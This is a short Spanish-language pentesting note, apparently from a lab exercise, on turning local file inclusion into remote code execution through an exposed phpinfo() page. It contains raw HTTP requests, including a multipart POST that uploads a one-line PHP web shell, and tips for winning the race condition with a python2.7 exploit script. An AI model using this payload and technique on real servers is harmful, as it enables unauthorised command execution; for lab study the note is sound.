https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html?highlight=phpinfo#lfi-to-rce-via-phpinfo
Si encontramos este archivo publico, obtenemos mucha info sobre la configuracion _php_ de la web.

---
_1)_ Ver si _file_upload_ esta habilitado. 

SI LO ESTA, podriamos intentar tramitar una solicitud por _POST_ subiendo un archivo al mismo _phpinfo()_. La peticion se veria mas o menos asi:

**Asi estaria en un principio:**
```
GET /info.php HTTP/1.1
Host: 192.168.111.134
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

**Asi estaria una vez modificado:**
```
POST /info.php HTTP/1.1
Host: 192.168.111.134
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--pwned

----pwned
Content-Disposition: form-data; name="name"; filename="cmd.php"
Content-Type: aplication/x-php

<?php system($_GET['cmd'])?>
----pwned
```


Si te deja, joya, si encontras un LFI --> _RCE_.

Ahora hay que aplicar un **Race Condition**, ya que casi siempre se elimina solo el archivo q se crea. Para ello, hay un script, alojado en `Escritorio/maquinas/Infovore/exploits/phpinfolfi.py`. Que tenes que debuggear bastante pero termina funcionando. **SE EJECUTA CON python2.7**

Cosas a tener en cuenta para debuggear:
_1ro_ -> Cambiar el payload, que esta bien al comienzo, en la 1ra funcion 
_2do_ -> Cambiar 2 ubicaciones, que estan en la linea 22 y 34 aprox.
_3ro_ -> Fijate como te da la respuesta el servidor para debuggear, por ej: _[name] =>; cmd.php_  --->    _[name] =&gt; cmd.php_
